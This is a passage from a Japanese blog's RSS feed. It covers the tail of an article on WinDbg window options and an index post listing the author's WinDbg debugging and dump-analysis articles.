            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;13--source-mode-on&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#13--source-mode-on&quot; aria-label=&quot;13  source mode on permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;13.  Source mode ON&lt;/h3&gt;
&lt;p&gt;デバッガーをソースモードに切り替えます。&lt;/p&gt;
&lt;p&gt;ソースモードがアクティブである場合、ステータスバーで ASM を使用することはできません。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/debug---source-mode&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;デバッグソースモード - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;14--source-mode-off&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#14--source-mode-off&quot; aria-label=&quot;14  source mode off permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;14.  Source mode OFF&lt;/h3&gt;
&lt;p&gt;デバッガーをアセンブリモードに切り替えます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/debug---source-mode&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;デバッグソースモード - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;15--font&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#15--font&quot; aria-label=&quot;15  font permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;15.  Font&lt;/h3&gt;
&lt;p&gt;デバッグウィンドウのフォントを変更できます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/view---font&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;フォントの表示 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;16--options&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#16--options&quot; aria-label=&quot;16  options permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;16.  Options&lt;/h3&gt;
&lt;p&gt;オプションウィンドウを開きます。
オプションウィンドウでは、以下の項目を設定可能です。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ソースウィンドウでタブ文字を表示する場合のタブの幅&lt;/li&gt;
&lt;li&gt;同時に開くことができるドキュメントまたはソースウィンドウの数&lt;/li&gt;
&lt;li&gt;ソース言語の解析によるシンタックスハイライトを有効化します&lt;/li&gt;
&lt;li&gt;マウスホバー時の解析を有効化します&lt;/li&gt;
&lt;li&gt;Enterキーで直前のコマンドを再実行する機能を有効化します&lt;/li&gt;
&lt;li&gt;自動スクロール機能を制御します&lt;/li&gt;
&lt;li&gt;ワークスペースをWinDbgに保存する時間と頻度を制御します&lt;/li&gt;
&lt;li&gt;簡易編集モードを有効化します&lt;/li&gt;
&lt;li&gt;表示されるテキストの色を変更します&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/view---options&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;オプションの表示 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 434px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/a2ea8226a0602eac51ed9c3bddb5c33f/ade6e/image-8.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 99.58333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAACq0lEQVQ4y5VU2W4aQRDcX0+U9zzkMd+ROFKkSJGykWNu9gCWvdgDzLEHYLBsjkrX2GDkxBZeqTQz2p6e6u7q1izTgGVaCMMB0jRFHMdnI0lipEmCodxL4ghuvw9tMh5jNBqhLEpst1vs93vsdjsF7l/7tmKzuttieXuP+Vpws4bmeh4ajQYqlYpimOc5sixT63Q6hesHcDwfPdeTvY9A4AtSsptk+Gml+HLZwdeqj4Y/gRaGIQhens/nmM1mKMsSc8Esy1GzPfipOBb0wiGGQwlPHmZURVEgiiIY7TacXg+MVuNrfYk9CAIFnk3TVDkqxGnfD2HaXfS9AF4QqrwtFgsFRkK7ZrOJnjgc0+FgMFAH13XR7XbBMw2fwp4I6ykyYZ5lM9k//SPohETomNFpZMf8kVW1WlUrWXY6HWGTqDQUUjCy5VqqtTiC5+VyqRhzr5GZ4zhHhmRLh8wpmZxePgcq5FarBcuylEPbtpUzvnYI6zWcMlYMWSWGR+mQ3XNWNHoJpzZHh0yoYRhHhnR4avBmh8xdW3SkxCr6YnLfkrPnRZIqu2g0W7j8c4Vmqy1685HlxVnI83+j0KJBiIHnYDqKkY9TlNMhbhfZWSiLh8I8aPQh91rbCfHxwsZn/Rqffk3w4fsQ77/FeHcRvQra1J0EizLHarUWrB5zKK31o2KhJj91w4Nuhmh4ov7sDslyj2i+xaDcICq3j9ioczzfycAIhGVxnD4UuBoOVlt60TbhOdJ6votsPMLseogym+BuffPi+GK47KDDx4JqvshG13/jStrPkLZri4QMw1TIZNrcbzbYcUY+AydlqdqyUHN0I3ZsU41Nres66vW6Wmu1mpIR9VmevP6/j73NxuAdzgRVFLZdU2Sj1gNkHNXrDbWn4F/CoSFIgEOFjfEXbyjEiwcQcNAAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/a2ea8226a0602eac51ed9c3bddb5c33f/8ac56/image-8.webp 240w,
/static/a2ea8226a0602eac51ed9c3bddb5c33f/e6590/image-8.webp 434w&quot;
              sizes=&quot;(max-width: 434px) 100vw, 434px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/a2ea8226a0602eac51ed9c3bddb5c33f/8ff5a/image-8.png 240w,
/static/a2ea8226a0602eac51ed9c3bddb5c33f/ade6e/image-8.png 434w&quot;
            sizes=&quot;(max-width: 434px) 100vw, 434px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/a2ea8226a0602eac51ed9c3bddb5c33f/ade6e/image-8.png&quot;
            alt=&quot;image-8.png&quot;
            title=&quot;image-8.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;今回は、WinDbgを用いたデバッグや解析の際に利用するウィンドウのインターフェースについてまとめました。&lt;/p&gt;
&lt;p&gt;WinDbgを用いたWindowsのデバッグやダンプの解析方法について公開しているその他情報については、以下のページのリストをご覧ください。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-001-index&quot;&gt;WinDbgを用いたデバッグとトラブルシューティングのテクニック&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[WinDbgを用いたデバッグとトラブルシューティングのテクニック]]></title><link>https://kashiwaba-yuki.com/windows-windbg-001-index</link><guid isPermaLink="false">https://kashiwaba-yuki.com/windows-windbg-001-index</guid><pubDate>Mon, 04 Oct 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;今回は、WinDbgを用いたWindowsのデバッグやダンプの解析方法について0から学べる情報を整理したいと思い、この記事を書き始めました。&lt;/p&gt;
&lt;p&gt;私は、本業の中でしばしばメモリダンプやプロセスダンプを解析してトラブルシューティングをしなければならないことがあるのですが、各問題の原因特定のために有効な調査方法についてわかりやすい情報が非常に少ないと感じています。&lt;/p&gt;
&lt;p&gt;そのため、常に手探りでの解析になることに苦しい思いをしており、WinDbgを用いた解析手法について充実したナレッジがないものかと常に思案していました。&lt;/p&gt;
&lt;p&gt;しかし、中々有効な情報源が見つからなかったこともあり、「まずは自分が情報を発信しよう」という考えのもと、WinDbgを用いた解析手法について整理した情報を公開していくことにしました。&lt;/p&gt;
&lt;p&gt;現時点(2021/10/02)ではまだ記事数は少ないですが、最終的にはWinDbgを用いた各種解析手法や、トラブルシューティングに有効なテクニックについて目的別に整理した記事を書いていこうと考えています。&lt;/p&gt;
&lt;p&gt;公開した記事はすべて以下に整理しています。&lt;/p&gt;
&lt;h2 id=&quot;記事カテゴリ一覧&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%A8%98%E4%BA%8B%E3%82%AB%E3%83%86%E3%82%B4%E3%83%AA%E4%B8%80%E8%A6%A7&quot; aria-label=&quot;記事カテゴリ一覧 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;記事カテゴリ一覧&lt;/h2&gt;
&lt;h3 id=&quot;はじめてのwindbg&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%AF%E3%81%98%E3%82%81%E3%81%A6%E3%81%AEwindbg&quot; aria-label=&quot;はじめてのwindbg permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;はじめてのWinDbg&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-002-tutorial&quot;&gt;WinDbgのユーザモードデバッグチュートリアルを試してみた&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-004-kernel-debug&quot;&gt;WinDbgでWindows10環境のカーネルデバッグを行う最初の一歩&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-003-ui&quot;&gt;WinDbgの各ウィンドウについてまとめてみた&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-005-kernel-dump&quot;&gt;Windows環境でカーネルメモリダンプを手動で取得し、WinDbgで解析する方法&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-008-time-travel-debugging&quot;&gt;Time Travel Debuggingで始める新しいデバッグ手法&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;windbgによるユーザモードデバッグ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg%E3%81%AB%E3%82%88%E3%82%8B%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%A2%E3%83%BC%E3%83%89%E3%83%87%E3%83%90%E3%83%83%E3%82%B0&quot; aria-label=&quot;windbgによるユーザモードデバッグ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbgによるユーザモードデバッグ&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-002-tutorial&quot;&gt;WinDbgのユーザモードデバッグチュートリアルを試してみた&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-007-memory-spoofing&quot;&gt;WinDbgでスタックポインタの指すメモリの情報を書き換えて任意の関数を実行させてみる&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-009-base64&quot;&gt;C言語で実装したBase64プログラムをWinDbgのTime Travel Debuggingで解析してみる&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-010-socket&quot;&gt;Windows SocketsでTCP通信とUDP通信を実装したプログラムをリバーシングしてみる&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;windbgによるカーネルモードデバッグ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg%E3%81%AB%E3%82%88%E3%82%8B%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89%E3%83%87%E3%83%90%E3%83%83%E3%82%B0&quot; aria-label=&quot;windbgによるカーネルモードデバッグ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbgによるカーネルモードデバッグ&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-004-kernel-debug&quot;&gt;WinDbgでWindows10環境のカーネルデバッグを行う最初の一歩&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windriver-001-tutorial&quot;&gt;Windowsカーネルドライバを自作してWinDbgで解析してみる&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windriver-002-irp&quot;&gt;Windowsカーネルドライバを自作してWinDbgでIRP要求をのぞいてみる&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;windbgによるプロセスダンプ解析&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg%E3%81%AB%E3%82%88%E3%82%8B%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%83%80%E3%83%B3%E3%83%97%E8%A7%A3%E6%9E%90&quot; aria-label=&quot;windbgによるプロセスダンプ解析 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbgによるプロセスダンプ解析&lt;/h3&gt;
&lt;p&gt;まだこのカテゴリの記事がありません。&lt;/p&gt;
&lt;h3 id=&quot;windbgによるメモリダンプ解析&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg%E3%81%AB%E3%82%88%E3%82%8B%E3%83%A1%E3%83%A2%E3%83%AA%E3%83%80%E3%83%B3%E3%83%97%E8%A7%A3%E6%9E%90&quot; aria-label=&quot;windbgによるメモリダンプ解析 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbgによるメモリダンプ解析&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-005-kernel-dump&quot;&gt;Windows環境でカーネルメモリダンプを手動で取得し、WinDbgで解析する方法&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;windbg-previewによる-time-trabel-debugging&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg-preview%E3%81%AB%E3%82%88%E3%82%8B-time-trabel-debugging&quot; aria-label=&quot;windbg previewによる time trabel debugging permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbg Previewによる Time Trabel Debugging&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-008-time-travel-debugging&quot;&gt;Time Travel Debuggingで始める新しいデバッグ手法&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-009-base64&quot;&gt;C言語で実装したBase64プログラムをWinDbgのTime Travel Debuggingで解析してみる&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-010-socket&quot;&gt;Windows SocketsでTCP通信とUDP通信を実装したプログラムをリバーシングしてみる&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;ユースケース別の解説記事&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%A6%E3%83%BC%E3%82%B9%E3%82%B1%E3%83%BC%E3%82%B9%E5%88%A5%E3%81%AE%E8%A7%A3%E8%AA%AC%E8%A8%98%E4%BA%8B&quot; aria-label=&quot;ユースケース別の解説記事 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ユースケース別の解説記事&lt;/h2&gt;
&lt;h3 id=&quot;windbgでメモリ情報を参照編集する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg%E3%81%A7%E3%83%A1%E3%83%A2%E3%83%AA%E6%83%85%E5%A0%B1%E3%82%92%E5%8F%82%E7%85%A7%E7%B7%A8%E9%9B%86%E3%81%99%E3%82%8B&quot; aria-label=&quot;windbgでメモリ情報を参照編集する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbgでメモリ情報を参照/編集する&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-007-memory-spoofing&quot;&gt;WinDbgでスタックポインタの指すメモリの情報を書き換えて任意の関数を実行させてみる&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
